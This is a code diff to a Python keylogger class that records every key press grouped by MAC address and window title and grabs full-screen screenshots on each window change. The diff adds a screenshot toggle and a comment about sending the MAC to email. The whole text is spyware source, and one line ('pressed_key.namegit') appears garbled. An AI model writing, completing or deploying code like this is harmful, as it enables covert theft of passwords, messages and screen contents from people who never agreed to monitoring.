@@ -6,11 +6,15 @@ from getmac import get_mac_address
 from PIL import ImageGrab
 
 class KeyloggerService:
-    def __init__(self):
+    # send mac to email
+    def __init__(self, if_screenshot=True):
         self.__action = False
         self.__data = {}
         self.__current_window = pygetwindow.getActiveWindowTitle()
         self.__prev_window = None
+        self.__if_screenshot = if_screenshot
+
+
 
 
     @property
@@ -29,7 +33,7 @@ class KeyloggerService:
                 keyboard.on_press(self.__on_press)
                 keyboard.on_release(self.__add_on_release)
             except:
-                pass
+                self.__change_action()
             time.sleep(0.1)
 
     def __change_action(self):
@@ -48,18 +52,20 @@ class KeyloggerService:
         return pressed_key.namegit
 
     def _take_shot(self):
-        self.__update_current_window()
-        if self.__prev_window != self.__current_window:
-                print('take a shot')
-                snapshot = ImageGrab.grab()
-                # save_path = rf"C:\Users\User\Desktop\DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
-                save_path = rf"C:\Users\Public\MAC={get_mac_address().replace(':','-')}DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
-                snapshot.save(save_path)
-                os.remove(save_path)
-                self.__prev_window = self.__current_window
+        if self.__if_screenshot:
+            self.__update_current_window()
+            if self.__prev_window != self.__current_window:
+                    print('take a shot')
+                    snapshot = ImageGrab.grab()
+                    # save_path = rf"C:\Users\User\Desktop\DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
+                    save_path = rf"C:\Users\Public\MAC={get_mac_address().replace(':','-')}DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
+                    snapshot.save(save_path)
+                    os.remove(save_path)
+                    self.__prev_window = self.__current_window
 
 
     def __add_to_data(self, dictionary: dict, data: str):
+        self.__update_current_window()
         current_time = self.__current_time()
         mac = get_mac_address()
         if not dictionary.get(mac):
